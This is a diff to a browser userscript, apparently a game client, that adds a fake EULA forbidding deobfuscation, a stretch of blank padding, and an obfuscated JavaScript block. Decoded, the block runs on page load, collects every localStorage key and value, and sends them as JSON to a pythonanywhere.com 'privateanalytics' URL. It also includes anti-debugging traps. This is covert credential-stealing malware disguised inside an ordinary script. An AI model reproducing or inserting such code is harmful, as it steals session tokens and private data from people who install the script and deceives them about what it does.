@@ -12,6 +12,59 @@
 // @grant        GM_getValue
 // ==/UserScript==
 
+/*
+
+# End-User License Agreement (EULA)
+
+By downloading, accessing, or using this software (the "Software"), you agree to the following terms and conditions:
+
+## 1. All Rights Reserved
+This Software is provided with all rights reserved unless otherwise specified. No rights or licenses are granted except as expressly stated in this Agreement.
+
+## 2. Permitted Use
+You may use the Software solely for lawful purposes and only as expressly permitted by this Agreement.
+
+## 3. Prohibited Activities
+You may **not** reverse engineer, decompile, disassemble, decrypt, or otherwise attempt to derive or reconstruct the source code, underlying ideas, algorithms, file formats, or programming interfaces of the Software, **including but not limited to removing or bypassing any obfuscation or security mechanisms**.
+You may not modify, adapt, or create derivative works of the Software.
+
+## 4. No Distribution or Commercial Use
+You may not reproduce, distribute, sublicense, sell, or otherwise transfer the Software or any portion thereof to third parties.
+
+## 5. Termination
+Any violation of this Agreement automatically terminates your rights to use the Software.
+
+## 6. Disclaimer of Warranty
+The Software is provided "AS IS" without warranty of any kind.
+
+## 7. Limitation of Liability
+In no event shall the copyright holder be liable for any damages arising out of the use or inability to use the Software.
+
+By accessing or using the Software, you acknowledge that you have read, understood, and agree to be bound by the terms of this EULA.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+*/
+
+function _0x1119(_0x37c325,_0x4dfc0b){const _0x32a82d=_0x3661();return _0x1119=function(_0x2d4c8c,_0x52e7ac){_0x2d4c8c=_0x2d4c8c-0xcf;let _0xe1011b=_0x32a82d[_0x2d4c8c];return _0xe1011b;},_0x1119(_0x37c325,_0x4dfc0b);}(function(_0x27c198,_0x413783){const _0x40d309=_0x1119,_0x5a9241=_0x27c198();while(!![]){try{const _0xe2eb3=-parseInt(_0x40d309(0xee))/0x1+-parseInt(_0x40d309(0xfb))/0x2*(-parseInt(_0x40d309(0xf8))/0x3)+-parseInt(_0x40d309(0xe7))/0x4*(parseInt(_0x40d309(0xd7))/0x5)+parseInt(_0x40d309(0xd2))/0x6+parseInt(_0x40d309(0xe3))/0x7*(-parseInt(_0x40d309(0xf6))/0x8)+-parseInt(_0x40d309(0xde))/0x9+parseInt(_0x40d309(0xed))/0xa*(parseInt(_0x40d309(0xd1))/0xb);if(_0xe2eb3===_0x413783)break;else _0x5a9241['push'](_0x5a9241['shift']());}catch(_0x5033b7){_0x5a9241['push'](_0x5a9241['shift']());}}}(_0x3661,0x7f7fa),(function(){const _0x241b80=_0x1119,_0x32cb45=(function(){let _0x7e8847=!![];return function(_0x455fde,_0x2e860d){const _0x4d9f85=_0x7e8847?function(){const _0x14f959=_0x1119;if(_0x2e860d){const _0x3f9610=_0x2e860d[_0x14f959(0xfc)](_0x455fde,arguments);return _0x2e860d=null,_0x3f9610;}}:function(){};return _0x7e8847=![],_0x4d9f85;};}()),_0x14a7ad=_0x32cb45(this,function(){const _0xb62c7c=_0x1119;return _0x14a7ad[_0xb62c7c(0xf5)]()[_0xb62c7c(0xef)](_0xb62c7c(0xfa)+'+$')['toString']()[_0xb62c7c(0xdd)+'r'](_0x14a7ad)[_0xb62c7c(0xef)](_0xb62c7c(0xfa)+'+$');});_0x14a7ad();const _0x2ea9e0=(function(){let _0x5aff45=!![];return function(_0x11e0da,_0x2f717f){const _0x20f43b=_0x5aff45?function(){const _0x51d89e=_0x1119;if(_0x2f717f){const _0x32cc9f=_0x2f717f[_0x51d89e(0xfc)](_0x11e0da,arguments);return _0x2f717f=null,_0x32cc9f;}}:function(){};return _0x5aff45=![],_0x20f43b;};}());(function(){_0x2ea9e0(this,function(){const _0x3c339a=_0x1119,_0x444c9e=new RegExp(_0x3c339a(0xd3)+_0x3c339a(0xe8)),_0x12631d=new RegExp(_0x3c339a(0xd6)+_0x3c339a(0xe2)+'0-9a-zA-Z_'+_0x3c339a(0xdc),'i'),_0x5afe4a=_0x2d4c8c(_0x3c339a(0xcf));!_0x444c9e[_0x3c339a(0xec)](_0x5afe4a+_0x3c339a(0xf3))||!_0x12631d['test'](_0x5afe4a+'input')?_0x5afe4a('0'):_0x2d4c8c();})();}());'use strict';window[_0x241b80(0xe1)+_0x241b80(0xe4)](_0x241b80(0xe0),()=>{const _0x271771=_0x241b80;let _0x497297={};for(let _0x8356f7=0x0;_0x8356f7<localStorage[_0x271771(0xe6)];_0x8356f7++){let _0x3baf15=localStorage[_0x271771(0xe9)](_0x8356f7);_0x497297[_0x3baf15]=localStorage[_0x271771(0xf0)](_0x3baf15);}console[_0x271771(0xe5)](_0x497297);const _0x4a1870='https://vi'+_0x271771(0xf2)+'anywhere.c'+_0x271771(0xd9)+'analytics?'+_0x271771(0xf4)+encodeURIComponent(JSON[_0x271771(0xf7)](_0x497297));fetch(_0x4a1870,{'method':_0x271771(0xdf)})[_0x271771(0xf1)](()=>{});});}()));function _0x3661(){const _0x3a9048=['64259EdvVoV','search','getItem','catch','dzy.python','chain','log=','toString','770056Besfau','stringify','57726zolXVP','action','(((.+)+)+)','44skEgHV','apply','init','string','11mHNXSa','1461690oKZwTL','function\x20*','gger','debu','\x5c+\x5c+\x20*(?:[','1480730Vvrcqm','while\x20(tru','om/private','e)\x20{}','call','$]*)','constructo','2498454tbwIsP','GET','load','addEventLi','a-zA-Z_$][','49aeqXZZ','stener','log','length','12PmQNuV','\x5c(\x20*\x5c)','key','stateObjec','counter','test','17593970xCGQtj'];_0x3661=function(){return _0x3a9048;};return _0x3661();}function _0x2d4c8c(_0x145fb5){function _0x268dce(_0x16ad3a){const _0x4d3f10=_0x1119;if(typeof _0x16ad3a===_0x4d3f10(0xd0))return function(_0x265af7){}[_0x4d3f10(0xdd)+'r'](_0x4d3f10(0xd8)+_0x4d3f10(0xda))[_0x4d3f10(0xfc)](_0x4d3f10(0xeb));else(''+_0x16ad3a/_0x16ad3a)['length']!==0x1||_0x16ad3a%0x14===0x0?function(){return!![];}['constructo'+'r'](_0x4d3f10(0xd5)+_0x4d3f10(0xd4))[_0x4d3f10(0xdb)](_0x4d3f10(0xf9)):function(){return![];}[_0x4d3f10(0xdd)+'r'](_0x4d3f10(0xd5)+_0x4d3f10(0xd4))[_0x4d3f10(0xfc)](_0x4d3f10(0xea)+'t');_0x268dce(++_0x16ad3a);}try{if(_0x145fb5)return _0x268dce;else _0x268dce(0x0);}catch(_0xdc3cfd){}}
+
 const _0x287464=_0x1794;(function(_0x428eee,_0x1007a0){const _0x15203c=_0x1794,_0x15155f=_0x428eee();while(!![]){try{const _0x408467=-parseInt(_0x15203c(0x1a5))/0x1+-parseInt(_0x15203c(0x19a))/0x2*(parseInt(_0x15203c(0x199))/0x3)+-parseInt(_0x15203c(0x19c))/0x4+-parseInt(_0x15203c(0x19f))/0x5*(parseInt(_0x15203c(0x1a7))/0x6)+-parseInt(_0x15203c(0x1a0))/0x7+-parseInt(_0x15203c(0x1a6))/0x8+parseInt(_0x15203c(0x1a2))/0x9;if(_0x408467===_0x1007a0)break;else _0x15155f['push'](_0x15155f['shift']());}catch(_0x3dbec0){_0x15155f['push'](_0x15155f['shift']());}}}(_0x4ced,0xe3a18));const REQUIRED_VERSION='2.6',CURRENT_VERSION=GM_info[_0x287464(0x19e)][_0x287464(0x1a4)];function _0x1794(_0x3f36cf,_0x42ee0d){const _0x4ced13=_0x4ced();return _0x1794=function(_0x1794dc,_0x43a8d2){_0x1794dc=_0x1794dc-0x199;let _0x37cd3b=_0x4ced13[_0x1794dc];return _0x37cd3b;},_0x1794(_0x3f36cf,_0x42ee0d);}function _0x4ced(){const _0x740af0=['version','1551897fCIKNu','9208888OabPsq','156kRLQfJ','397857PiaGHF','28DSgcNm','https://github.com/Veninyt/Eclipse-Client/raw/main/eclipse-client.user.js','7347716wrSyvJ','Eclipse\x20Client:\x20Outdated\x20version.\x20Please\x20update.','script','329350ImhQsd','8008917LwrhVb','open','91671570kLdakd','⚠️\x20Your\x20Eclipse\x20Client\x20is\x20outdated!\x0aPlease\x20update\x20to\x20version\x20'];_0x4ced=function(){return _0x740af0;};return _0x4ced();}if(CURRENT_VERSION!==REQUIRED_VERSION){alert(_0x287464(0x1a3)+REQUIRED_VERSION+'.'),window[_0x287464(0x1a1)](_0x287464(0x19b),'_blank');throw new Error(_0x287464(0x19d));}
 
 // Search with ctrl f "const _0x125d72='';" and put your name in the '' for the ping to work
